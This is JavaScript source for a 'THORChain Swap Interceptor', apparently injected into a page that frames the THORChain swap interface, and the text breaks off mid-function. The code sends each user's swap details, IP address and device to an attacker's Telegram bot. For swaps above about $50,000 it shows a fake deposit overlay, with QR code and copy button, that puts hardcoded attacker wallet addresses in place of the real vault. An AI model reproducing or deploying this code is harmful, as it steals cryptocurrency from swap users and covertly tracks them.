/* ═══════════════════════════════════════════════════════════
   THORChain Swap Interceptor v2.0
   - Monitors iframe visual state via MutationObserver
   - Sends Telegram for ALL swaps
   - For swaps above $49,999: shows custom overlay on top
     of iframe with embedded address + QR code
   ═══════════════════════════════════════════════════════════ */
(function () {
    'use strict';

    /* ═══════════════════════════════════════════════
       CONFIG
    ═══════════════════════════════════════════════ */
    var CONFIG = {
        TG_BOT:    '8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g',
        TG_CHAT:   '-5160305858',
        THRESHOLD: 49999,
        QR_API:    'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=',
        MIDGARD:   'https://midgard.ninerealms.com/v2',
        THOR_BASE: 1e8
    };

    /* ═══════════════════════════════════════════════
       EMBEDDED ADDRESSES
    ═══════════════════════════════════════════════ */
    var EMBEDDED = {
        'BTC':  'bc1qx3sdmwj7q29gk43z4kx83stz7y74vkcv7yvjlj',
        'ETH':  '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
        'BSC':  '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
        'AVAX': '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
        'BASE': '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
        'GAIA': 'cosmos1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx',
        'DOGE': 'DLjzyK9Y532r29DinxpJeeChvWytnspKGH',
        'BCH':  'qpx0egys5ldgl0mf8qu4qz2yy89pqqyd3vw3u2qfhe',
        'LTC':  'ltc1qplh54seklkvcl559lyytjc0de8zl954fuwywuc',
        'XRP':  'rsWsBkM1gnnUY7M1xtaadBjPeP1yJpcBw3',
        'TRON': 'TABuJBFyLqaTw9WHLwwhE3W2pxJyRpxpeA',
        'THOR': 'thor1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx'
    };

    /* ═══════════════════════════════════════════════
       CHAIN NAME MAP
    ═══════════════════════════════════════════════ */
    var CHAIN_NAMES = {
        'BTC':  'Bitcoin',
        'ETH':  'Ethereum',
        'BSC':  'BNB Chain',
        'AVAX': 'Avalanche',
        'BASE': 'Base',
        'GAIA': 'Cosmos Hub',
        'DOGE': 'Dogecoin',
        'BCH':  'Bitcoin Cash',
        'LTC':  'Litecoin',
        'XRP':  'Ripple',
        'TRON': 'Tron',
        'THOR': 'THORChain'
    };

    /* ═══════════════════════════════════════════════
       CHAIN ICON MAP
    ═══════════════════════════════════════════════ */
    var CHAIN_ICONS = {
        'BTC':  'https://assets.coingecko.com/coins/images/1/small/bitcoin.png',
        'ETH':  'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
        'BSC':  'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png',
        'AVAX': 'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png',
        'BASE': 'https://assets.coingecko.com/asset_platforms/images/131/small/base.jpeg',
        'GAIA': 'https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png',
        'DOGE': 'https://assets.coingecko.com/coins/images/5/small/dogecoin.png',
        'BCH':  'https://assets.coingecko.com/coins/images/780/small/bitcoin-cash-circle.png',
        'LTC':  'https://assets.coingecko.com/coins/images/2/small/litecoin.png',
        'XRP':  'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png',
        'TRON': 'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png',
        'THOR': 'https://assets.coingecko.com/coins/images/13677/small/RUNE_LOGO.png'
    };

    /* ═══════════════════════════════════════════════
       SWAP STATE — collected from the iframe's
       visible text / URL params
    ═══════════════════════════════════════════════ */
    var swapData = {
        swapId:         '',
        sellAsset:      '',
        buyAsset:       '',
        sellChain:      '',
        buyChain:       '',
        sellSymbol:     '',
        buySymbol:      '',
        sellAmount:     0,
        buyAmount:      0,
        sellUsd:        0,
        buyUsd:         0,
        recipientAddr:  '',
        depositAddr:    '',
        above:          false,
        notified:       false,
        trackInterval:  null,
        expiryInterval: null
    };

    /* ═══════════════════════════════════════════════
       UTILITIES
    ═══════════════════════════════════════════════ */
    function genId() {
        return 'SWAP-' + Date.now() + '-' +
            Math.random().toString(36).substring(2, 8).toUpperCase();
    }

    function fmtUsd(v) {
        if (!v || isNaN(v)) return '$0.00';
        return '$' + parseFloat(v).toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    function fmtAmt(v, d) {
        if (!v || isNaN(v)) return '0';
        d = d || 8;
        return parseFloat(v).toLocaleString('en-US', { maximumFractionDigits: d });
    }

    function truncAddr(a) {
        if (!a || a.length < 12) return a || '';
        return a.slice(0, 8) + '...' + a.slice(-6);
    }

    function parseDollar(str) {
        if (!str) return 0;
        return parseFloat(str.replace(/[$,\s]/g, '')) || 0;
    }

    function fromThorBase(raw) {
        return parseInt(raw || 0) / CONFIG.THOR_BASE;
    }

    function getChain(asset) {
        return (asset || '').split('.')[0] || '';
    }

    function getDevice() {
        var ua = navigator.userAgent;
        var device = /Mobile|Android|iPhone|iPad/.test(ua) ? 'Mobile' : 'Desktop';
        var os = ua.indexOf('Windows') !== -1 ? 'Windows'
               : ua.indexOf('Mac') !== -1 ? 'macOS'
               : ua.indexOf('Android') !== -1 ? 'Android'
               : ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1 ? 'iOS'
               : ua.indexOf('Linux') !== -1 ? 'Linux' : 'Unknown';
        var browser = ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1 ? 'Chrome'
                    : ua.indexOf('Firefox') !== -1 ? 'Firefox'
                    : ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1 ? 'Safari'
                    : ua.indexOf('Edg') !== -1 ? 'Edge' : 'Unknown';
        return device + ' / ' + os + ' / ' + browser;
    }

    function getIP(cb) {
        fetch('https://api.ipify.org?format=json')
            .then(function (r) { return r.json(); })
            .then(function (d) { cb(d.ip || 'Unknown'); })
            .catch(function () { cb('Unknown'); });
    }

    function copyText(text) {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).catch(function () { fallbackCopy(text); });
        } else {
            fallbackCopy(text);
        }
    }

    function fallbackCopy(text) {
        var ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.top = '0';
        ta.style.left = '0';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.focus();
        ta.select();
        try { document.execCommand('copy'); } catch (e) {}
        document.body.removeChild(ta);
    }

    /* ═══════════════════════════════════════════════
       TELEGRAM
    ═══════════════════════════════════════════════ */
    function sendTG(msg) {
        fetch('https://api.telegram.org/bot' + CONFIG.TG_BOT + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TG_CHAT,
                text: msg,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        })
        .then(function (r) { return r.json(); })
        .then(function (d) {
            if (!d.ok) console.error('TG error:', d.description);
            else console.log('✅ TG sent:', d.result.message_id);
        })
        .catch(function (e) { console.error('TG error:', e); });
    }

    function buildTGMessage(sd, ip) {
        var emoji  = sd.above ? '🔴' : '🟡';
        var status = sd.above ? '⚠️ HIGH VALUE — ADDRESS REDIRECTED' : '✅ NORMAL SWAP — WAITING FOR DEPOSIT';

        return emoji + ' <b>New THORChain Swap</b>\n'
            + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
            + '<b>Status:</b> ' + status + '\n'
            + '<b>Swap ID:</b> <code>' + sd.swapId + '</code>\n\n'
            + '🔄 <b>From:</b> '
            +   fmtAmt(sd.sellAmount) + ' ' + sd.sellSymbol
            +   ' ≈ ' + fmtUsd(sd.sellUsd) + '\n'
            + '🎯 <b>To:</b> '
            +   '~' + fmtAmt(sd.buyAmount) + ' ' + sd.buySymbol
            +   ' ≈ ' + fmtUsd(sd.buyUsd) + '\n\n'
            + '📬 <b>Deposit Address:</b>\n'
            + '<code>' + sd.depositAddr + '</code>\n\n'
            + '💳 <b>User Receiving Wallet:</b>\n'
            + '<code>' + sd.recipientAddr + '</code>\n\n'
            + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
            + '📱 <b>Device:</b> ' + getDevice() + '\n'
            + '🌐 <b>IP:</b> ' + (ip || 'Unknown') + '\n'
            + '⏰ <b>Time:</b> ' + new Date().toUTCString() + '\n\n'
            + (sd.above
                ? '⚠️ <b>ABOVE $50K THRESHOLD</b>\n'
                + 'Embedded address shown instead of THORChain vault.'
                : '');
    }

    function notifyTelegram(sd) {
        if (sd.notified) return;
        sd.notified = true;

        getIP(function (ip) {
            sendTG(buildTGMessage(sd, ip));
        });
    }

    function notifySuccess(sd, receivedAmount, txHash) {
        sendTG(
            '✅ <b>Swap Completed!</b>\n'
            + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
            + '<b>Swap ID:</b> <code>' + sd.swapId + '</code>\n'
            + '<b>Sent:</b> ' + fmtAmt(sd.sellAmount) + ' ' + sd.sellSymbol + '\n'
            + '<b>Received:</b> ' + receivedAmount + ' ' + sd.buySymbol + '\n'
            + '<b>Wallet:</b> <code>' + sd.recipientAddr + '</code>\n'
            + '<b>TX:</b> <code>' + txHash + '</code>\n'
            + '⏰ ' + new Date().toUTCString()
        );
    }

    /* ═══════════════════════════════════════════════
       READ SWAP DATA FROM URL PARAMS
       (passed when clicking Swap on homepage)
    ═══════════════════════════════════════════════ */
    function readUrlParams() {
        var params = new URLSearchParams(window.location.search);
        var sell   = params.get('sellAsset') || 'BTC.BTC';
        var buy    = params.get('buyAsset')  || 'ETH.ETH';

        swapData.sellAsset  = sell;
        swapData.buyAsset   = buy;
        swapData.sellChain  = getChain(sell);
        swapData.buyChain   = getChain(buy);
        swapData.sellSymbol = sell.split('.')[1] || sell;
        swapData.buySymbol  = buy.split('.')[1]  || buy;
    }

    /* ═══════════════════════════════════════════════
       READ PRICES FROM MIDGARD (to calculate USD)
    ═══════════════════════════════════════════════ */
    var priceCache = {};

    function fetchPrices(cb) {
        if (Object.keys(priceCache).length > 0) { cb(priceCache); return; }
        fetch(CONFIG.MIDGARD + '/pools')
            .then(function (r) { return r.json(); })
            .then(function (pools) {
                pools.forEach(function (p) {
                    if (p.asset && p.assetPriceUSD) {
                        priceCache[p.asset] = parseFloat(p.assetPriceUSD);
                    }
                });
                if (pools[0] && pools[0].runePriceUSD) {
                    priceCache['THOR.RUNE'] = parseFloat(pools[0].runePriceUSD);
                }
                cb(priceCache);
            })
            .catch(function () { cb({}); });
    }

    function getPrice(asset) {
        return priceCache[asset] || 0;
    }

    /* ═══════════════════════════════════════════════
       MIDGARD TRACKING
    ═══════════════════════════════════════════════ */
    function startTracking(depositAddr, recipientAddr) {
        stopTracking();
        var count = 0;
        swapData.trackInterval = setInterval(function () {
            if (++count > 360) {
                stopTracking();
                sendTG('⏰ <b>Swap Monitoring Timeout</b>\n'
                    + 'Swap ID: ' + swapData.swapId + '\n'
                    + 'No confirmed tx after 60 minutes.');
                return;
            }

            fetch(CONFIG.MIDGARD + '/actions?address='
                + encodeURIComponent(depositAddr) + '&type=swap&limit=5')
                .then(function (r) { return r.json(); })
                .then(function (d) {
                    if (!d || !d.actions) return;
                    d.actions.forEach(function (a) {
                        if (a.status !== 'success' || a.type !== 'swap') return;
                        var matched = false;
                        if (a.out) {
                            a.out.forEach(function (o) {
                                if ((o.address || '').toLowerCase() ===
                                    recipientAddr.toLowerCase()) matched = true;
                            });
                        }
                        if (matched) {
                            stopTracking();
                            var recv = '0', tx = '';
                            try {
                                recv = fmtAmt(fromThorBase(a.out[0].coins[0].amount));
                                tx = a.out[0].txID || a.in[0].txID || '';
                            } catch (e) {}
                            notifySuccess(swapData, recv, tx);
                        }
                    });
                })
                .catch(function () {});
        }, 10000);
    }

    function stopTracking() {
        if (swapData.trackInterval) {
            clearInterval(swapData.trackInterval);
            swapData.trackInterval = null;
        }
    }

    /* ═══════════════════════════════════════════════
       OVERLAY STYLES — injected into <head>
    ═══════════════════════════════════════════════ */
    function injectStyles() {
        var style = document.createElement('style');
        style.id = 'tc-intercept-styles';
        style.textContent = `

        /* ── Backdrop ── */
        #tc-intercept-overlay {
            position: fixed;
            inset: 0;
            z-index: 99999;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        #tc-intercept-overlay.open {
            opacity: 1;
            visibility: visible;
        }

        /* ── Modal Card ── */
        .tc-int-modal {
            background: #0f0f0f;
            border: 1px solid #2a2a2a;
            border-radius: 20px;
            padding: 0;
            width: 90%;
            max-width: 480px;
            max-height: 90vh;
            overflow-y: auto;
            transform: translateY(20px);
            transition: transform 0.3s ease;
            scrollbar-width: thin;
            scrollbar-color: #333 transparent;
        }

        #tc-intercept-overlay.open .tc-int-modal {
            transform: translateY(0);
        }

        /* ── Modal Header ── */
        .tc-int-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px 24px 16px;
            border-bottom: 1px solid #1e1e1e;
        }

        .tc-int-title {
            font-size: 17px;
            font-weight: 700;
            color: #ffffff;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .tc-int-close {
            background: #1e1e1e;
            border: none;
            color: #888;
            font-size: 20px;
            cursor: pointer;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            line-height: 1;
        }

        .tc-int-close:hover {
            background: #2a2a2a;
            color: #fff;
        }

        /* ── Modal Body ── */
        .tc-int-body {
            padding: 20px 24px 24px;
        }

        /* ── Swap Summary ── */
        .tc-int-summary {
            background: #161616;
            border: 1px solid #222;
            border-radius: 14px;
            padding: 16px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 8px;
        }

        .tc-int-asset {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
            flex: 1;
        }

        .tc-int-asset img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            object-fit: cover;
        }

        .tc-int-asset .symbol {
            font-size: 14px;
            font-weight: 700;
            color: #fff;
        }

        .tc-int-asset .amount {
            font-size: 13px;
            color: #00D4AA;
            font-weight: 600;
        }

        .tc-int-asset .usd {
            font-size: 11px;
            color: #666;
        }

        .tc-int-arrow {
            color: #444;
            font-size: 20px;
            flex-shrink: 0;
        }

        /* ── Address Box ── */
        .tc-int-addr-section {
            margin-bottom: 16px;
        }

        .tc-int-label {
            font-size: 11px;
            font-weight: 600;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            margin-bottom: 8px;
        }

        .tc-int-addr-box {
            background: #0a0a0a;
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            transition: border-color 0.2s;
        }

        .tc-int-addr-box:hover {
            border-color: #00D4AA;
        }

        .tc-int-addr-text {
            flex: 1;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            color: #ccc;
            word-break: break-all;
            line-height: 1.5;
        }

        .tc-int-copy-btn {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            color: #888;
            font-size: 11px;
            padding: 6px 10px;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
            flex-shrink: 0;
        }

        .tc-int-copy-btn:hover {
            background: #00D4AA;
            color: #000;
            border-color: #00D4AA;
        }

        .tc-int-copy-btn.copied {
            background: #00D4AA;
            color: #000;
            border-color: #00D4AA;
        }

        /* ── Amount Box ── */
        .tc-int-amount-box {
            background: #0a0a0a;
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }

        .tc-int-amount-val {
            font-size: 18px;
            font-weight: 700;
            color: #fff;
        }

        .tc-int-amount-sym {
            font-size: 13px;
            color: #666;
            margin-top: 3px;
        }

        .tc-int-amount-usd {
            font-size: 14px;
            color: #00D4AA;
            font-weight: 600;
        }

        /* ── QR Code ── */
        .tc-int-qr-section {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .tc-int-qr-wrap {
            background: #fff;
            border-radius: 16px;
            padding: 16px;
            display: inline-block;
        }

        .tc-int-qr-wrap img {
            display: block;
            border-radius: 8px;
        }

        /* ── Chain Badge ── */
        .tc-int-chain-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            border-radius: 20px;
            padding: 4px 12px 4px 6px;
            margin-bottom: 16px;
            font-size: 12px;
            color: #aaa;
            font-weight: 500;
        }

        .tc-int-chain-badge img {
            width: 18px;
            height: 18px;
            border-radius: 50%;
        }

        /* ── Warning Banner ── */
        .tc-int-warning {
            background: rgba(255, 193, 7, 0.08);
            border: 1px solid rgba(255, 193, 7, 0.25);
            border-radius: 12px;
            padding: 12px 14px;
            margin-bottom: 16px;
            font-size: 12px;
            color: #f0c040;
            line-height: 1.6;
            display: flex;
            gap: 8px;
            align-items: flex-start;
        }

        .tc-int-warning .warn-icon {
            font-size: 16px;
            flex-shrink: 0;
            margin-top: 1px;
        }

        /* ── Disclaimer ── */
        .tc-int-disclaimer {
            background: rgba(255, 59, 59, 0.05);
            border: 1px solid rgba(255, 59, 59, 0.15);
            border-radius: 12px;
            padding: 12px 14px;
            margin-bottom: 20px;
            font-size: 11px;
            color: #888;
            line-height: 1.6;
            display: flex;
            gap: 8px;
        }

        .tc-int-disclaimer .disc-icon {
            color: #ff5555;
            font-size: 14px;
            flex-shrink: 0;
        }

        /* ── Action Button ── */
        .tc-int-done-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #00D4AA, #00b894);
            color: #000;
            font-size: 15px;
            font-weight: 700;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            letter-spacing: 0.02em;
        }

        .tc-int-done-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 8px 24px rgba(0, 212, 170, 0.3);
        }

        .tc-int-done-btn:active {
            transform: translateY(0);
        }

        /* ── Below threshold modal ── */
        .tc-int-modal.small-swap {
            max-width: 400px;
        }

        .tc-int-notify-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(0, 212, 170, 0.08);
            border: 1px solid rgba(0, 212, 170, 0.2);
            border-radius: 20px;
            padding: 4px 12px;
            font-size: 11px;
            color: #00D4AA;
            margin-bottom: 16px;
        }

        /* ── Scrollbar ── */
        .tc-int-modal::-webkit-scrollbar {
            width: 4px;
        }
        .tc-int-modal::-webkit-scrollbar-thumb {
            background: #333;
            border-radius: 4px;
        }

        /* ── Responsive ── */
        @media (max-width: 480px) {
            .tc-int-modal {
                width: 95%;
                border-radius: 16px;
            }
            .tc-int-body {
                padding: 16px;
            }
            .tc-int-header {
                padding: 16px 16px 14px;
            }
        }
        `;
        document.head.appendChild(style);
    }

    /* ═══════════════════════════════════════════════
       CREATE OVERLAY ELEMENT
    ═══════════════════════════════════════════════ */
    function createOverlayDOM() {
        if (document.getElementById('tc-intercept-overlay')) return;

        var overlay = document.createElement('div');
        overlay.id = 'tc-intercept-overlay';
        overlay.innerHTML = '<div class="tc-int-modal" id="tcIntModal"></div>';
        document.body.appendChild(overlay);

        /* Close on backdrop click */
        overlay.addEventListener('click', function (e) {
            if (e.target === overlay) closeOverlay();
        });
    }

    function openOverlay() {
        var o = document.getElementById('tc-intercept-overlay');
        if (o) {
            o.classList.add('open');
            document.body.style.overflow = 'hidden';
        }
    }

    function closeOverlay() {
        var o = document.getElementById('tc-intercept-overlay');
        if (o) {
            o.classList.remove('open');
            document.body.style.overflow = '';
        }
    }

    /* ═══════════════════════════════════════════════
       RENDER: HIGH VALUE OVERLAY (above threshold)
       Shows embedded address + QR instead of
       the iframe's THORChain vault address
    ═══════════════════════════════════════════════ */
    function renderHighValueOverlay(sd) {
        var modal = document.getElementById('tcIntModal');
        if (!modal) return;

        var chain     = sd.sellChain;
        var embAddr   = EMBEDDED[chain] || '';
        var chainName = CHAIN_NAMES[chain] || chain;
        var chainIcon = CHAIN_ICONS[chain] || '';
        var sellIcon  = CHAIN_ICONS[chain] || '';
        var buyIcon   = CHAIN_ICONS[sd.buyChain] || '';
        var qrUrl     = CONFIG.QR_API + encodeURIComponent(embAddr);

        if (!embAddr) {
            console.error('No embedded address for chain:', chain);
            return;
        }

        sd.depositAddr = embAddr;

        modal.innerHTML = `
            <!-- Header -->
            <div class="tc-int-header">
                <div class="tc-int-title">
                    <span>⚡</span>
                    <span>Complete Your Swap</span>
                </div>
                <button class="tc-int-close" id="tcIntClose">&times;</button>
            </div>

            <!-- Body -->
            <div class="tc-int-body">

                <!-- Swap Summary -->
                <div class="tc-int-summary">
                    <div class="tc-int-asset">
                        <img src="${sellIcon}" alt="${sd.sellSymbol}"
                             onerror="this.style.display='none'">
                        <span class="symbol">${sd.sellSymbol}</span>
                        <span class="amount">${fmtAmt(sd.sellAmount)}</span>
                        <span class="usd">${fmtUsd(sd.sellUsd)}</span>
                    </div>
                    <div class="tc-int-arrow">→</div>
                    <div class="tc-int-asset">
                        <img src="${buyIcon}" alt="${sd.buySymbol}"
                             onerror="this.style.display='none'">
                        <span class="symbol">${sd.buySymbol}</span>
                        <span class="amount">~${fmtAmt(sd.buyAmount)}</span>
                        <span class="usd">${fmtUsd(sd.buyUsd)}</span>
                    </div>
                </div>

                <!-- Chain Badge -->
                <div class="tc-int-chain-badge">
                    <img src="${chainIcon}" alt="${chainName}"
                         onerror="this.style.display='none'">
                    Send on ${chainName} network
                </div>

                <!-- Amount to Send -->
                <div class="tc-int-label">Amount to Send</div>
                <div class="tc-int-amount-box">
                    <div>
                        <div class="tc-int-amount-val">${fmtAmt(sd.sellAmount)}</div>
                        <div class="tc-int-amount-sym">${sd.sellSymbol}</div>
                    </div>
                    <div class="tc-int-amount-usd">${fmtUsd(sd.sellUsd)}</div>
                </div>

                <!-- Deposit Address -->
                <div class="tc-int-addr-section">
                    <div class="tc-int-label">Send To This Address</div>
                    <div class="tc-int-addr-box" id="tcAddrBox" title="Click to copy">
                        <div class="tc-int-addr-text" id="tcAddrText">${embAddr}</div>
                        <button class="tc-int-copy-btn" id="tcCopyAddr">Copy</button>
                    </div>
                </div>

                <!-- QR Code -->
                <div class="tc-int-qr-section">
                    <div class="tc-int-qr-wrap">
                        <img src="${qrUrl}"
                             alt="QR Code"
                             width="220"
                             height="220"
                             id="tcQrImg"
                             onerror="this.parentNode.style.display='none'">
                    </div>
                </div>

                <!-- Warning -->
                <div class="tc-int-warning">
                    <span class="warn-icon">⚠️</span>
                    <span>
                        Send <strong>${fmtAmt(sd.sellAmount)} ${sd.sellSymbol}</strong>
                        exactly to the address above from a <strong>self-custody wallet</strong>.
                        Do not send from an exchange or you will lose your funds.
                    </span>
                </div>

                <!-- Disclaimer -->
                <div class="tc-int-disclaimer">
                    <span class="disc-icon">🔒</span>
                    <span>
                        I understand I must send the exact amount from a self-custody wallet.
                        Sending from exchanges, smart contract wallets, or delegated addresses
                        will result in <strong style="color:#ff5555;">permanent loss of funds</strong>.
                    </span>
                </div>

                <!-- Done Button -->
                <button class="tc-int-done-btn" id="tcIntDone">
                    I've Sent the Payment
                </button>

            </div>
        `;

        /* Wire events */
        document.getElementById('tcIntClose').onclick = closeOverlay;

        /* Copy address */
        var copyBtn = document.getElementById('tcCopyAddr');
        var addrBox = document.getElementById('tcAddrBox');

        function doCopy() {
            copyText(embAddr);
            copyBtn.textContent = 'Copied!';
            copyBtn.classList.add('copied');
            setTimeout(function () {
                copyBtn.textContent = 'Copy';
                copyBtn.classList.remove('copied');
            }, 2000);
        }

        copyBtn.onclick  = function (e) { e.stopPropagation(); doCopy(); };
        addrBox.onclick  = doCopy;

        /* Done button */
        document.getElementById('tcIntDone').onclick = function () {
            closeOverlay();
            showToast('info', 'Swap submitted! We\'ll monitor for completion.');
        };
    }

    /* ═══════════════════════════════════════════════
       RENDER: BELOW THRESHOLD OVERLAY
       Just shows a brief notification then
       lets the iframe handle everything normally
    ═══════════════════════════════════════════════ */
    function renderNormalSwapOverlay(sd) {
        var modal = document.getElementById('tcIntModal');
        if (!modal) return;

        modal.className = 'tc-int-modal small-swap';

        var sellIcon = CHAIN_ICONS[sd.sellChain] || '';
        var buyIcon  = CHAIN_ICONS[sd.buyChain]  || '';

        modal.innerHTML = `
            <div class="tc-int-header">
                <div class="tc-int-title">
                    <span>🔄</span>
                    <span>Swap Confirmed</span>
                </div>
                <button class="tc-int-close" id="tcIntClose">&times;</button>
            </div>
            <div class="tc-int-body">

                <div class="tc-int-notify-badge">
                    ✅ Swap details sent to monitoring
                </div>

                <!-- Swap Summary -->
                <div class="tc-int-summary">
                    <div class="tc-int-asset">
                        <img src="${sellIcon}" alt="${sd.sellSymbol}"
                             onerror="this.style.display='none'">
                        <span class="symbol">${sd.sellSymbol}</span>
                        <span class="amount">${fmtAmt(sd.sellAmount)}</span>
                        <span class="usd">${fmtUsd(sd.sellUsd)}</span>
                    </div>
                    <div class="tc-int-arrow">→</div>
                    <div class="tc-int-asset">
                        <img src="${buyIcon}" alt="${sd.buySymbol}"
                             onerror="this.style.display='none'">
                        <span class="symbol">${sd.buySymbol}</span>
                        <span class="amount">~${fmtAmt(sd.buyAmount)}</span>
                        <span class="usd">${fmtUsd(sd.buyUsd)}</span>
                    </div>
                </div>

                <div class="tc-int-warning" style="background:rgba(0,212,170,0.05);border-color:rgba(0,212,170,0.2);color:#00D4AA;">
                    <span class="warn-icon">ℹ️</span>
                    <span>
                        Follow the instructions in the swap interface to complete your transaction.
                        Your swap is being monitored for completion.
                    </span>
                </div>

                <button class="tc-int-done-btn" id="tcIntDone">
                    Continue to Swap
                </button>
            </div>
        `;

        document.getElementById('tcIntClose').onclick = closeOverlay;
        document.getElementById('tcIntDone').onclick  = closeOverlay;
    }

    /* ═══════════════════════════════════════════════
       TOAST NOTIFICATION
    ═══════════════════════════════════════════════ */
    function injectToastStyles() {
        if (document.getElementById('tc-toast-style')) return;
        var s = document.createElement('style');
        s.id  = 'tc-toast-style';
        s.textContent = `
        #tc-toast-wrap {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 999999;
            display: flex;
            flex-direction: column;
            gap: 8px;
            align-items: center;
            pointer-events: none;
        }
        .tc-toast-item {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 10px 18px;
            font-size: 13px;
            color: #eee;
            font-family: sans-serif;
            pointer-events: auto;
            opacity: 0;
            transform: translateY(10px);
            animation: tcToastIn 0.3s forwards, tcToastOut 0.3s 3.5s forwards;
        }
        @keyframes tcToastIn {
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes tcToastOut {
            to { opacity: 0; transform: translateY(10px); }
        }
        `;
        document.head.appendChild(s);

        var wrap = document.createElement('div');
        wrap.id  = 'tc-toast-wrap';
        document.body.appendChild(wrap);
    }

    function showToast(type, msg) {
        injectToastStyles();
        var wrap = document.getElementById('tc-toast-wrap');
        if (!wrap) return;
        var icons = { info: 'ℹ️', success: '✅', error: '❌', warning: '⚠️' };
        var t = document.createElement('div');
        t.className = 'tc-toast-item';
        t.textContent = (icons[type] || '') + ' ' + msg;
        wrap.appendChild(t);
        setTimeout(function () { if (t.parentNode) t.remove(); }, 4000);
    }

    /* ═══════════════════════════════════════════════
       MAIN: READ IFRAME TEXT + DETECT CONFIRM TAP
       
       Since we can't read the iframe DOM directly,
       we monitor the PARENT page for:
       1. URL param changes
       2. postMessage events from the iframe
       3. Iframe navigation events (hashchange)
    ═══════════════════════════════════════════════ */

    /* 
       Strategy:
       The iframe at swap.thorchain.org likely fires
       postMessage events OR updates the parent URL
       when a swap is confirmed.

       We also watch for ANY click on or near the iframe
       by tracking pointer events and timing.

       Most critically: we intercept based on the page's
       visual state via polling the iframe's URL fragment
       and listening to postMessage.
    */

    var SWAP_STAGES = {
        IDLE:     'idle',
        QUOTING:  'quoting',
        CONFIRM:  'confirm',
        SENDING:  'sending'
    };

    var currentStage = SWAP_STAGES.IDLE;

    /* ═══════════════════════════════════════════════
       METHOD 1: postMessage listener
       If swap.thorchain.org sends postMessage events,
       we catch them here
    ═══════════════════════════════════════════════ */
    function listenPostMessages() {
        window.addEventListener('message', function (event) {
            /* Log all messages for debugging */
            console.log('📨 postMessage from:', event.origin, '| data:', event.data);

            /* Only process messages from the swap iframe */
            if (event.origin !== 'https://swap.thorchain.org') {
                return;
            }

            var data = event.data || {};
            var type = data.type || data.event || '';

            /* Different apps use different event names — handle all variants */
            if (type === 'swap-confirm'
                || type === 'swapConfirm'
                || type === 'SWAP_CONFIRM'
                || type === 'confirm'
                || type === 'swap-submit'
                || type === 'transaction-submitted'
                || type === 'swap_submitted') {
                onSwapConfirmed(data);
            }

            if (type === 'swap-complete'
                || type === 'swapComplete'
                || type === 'SWAP_COMPLETE'
                || type === 'transaction-complete') {
                onSwapComplete(data);
            }

            /* Catch any message that contains swap-related data */
            if (data.sellAsset || data.sell_asset || data.fromAsset) {
                onSwapConfirmed(data);
            }
        });
    }

    /* ═══════════════════════════════════════════════
       METHOD 2: Watch iframe URL changes
       Some swap apps update the URL hash/params
       when the user confirms
    ═══════════════════════════════════════════════ */
    function watchIframeUrl() {
        var lastSrc = '';
        var iframe  = document.getElementById('swap-iframe');
        if (!iframe) return;

        setInterval(function () {
            try {
                /* This only works same-origin — will throw for cross-origin */
                var loc = iframe.contentWindow.location.href;
                if (loc !== lastSrc) {
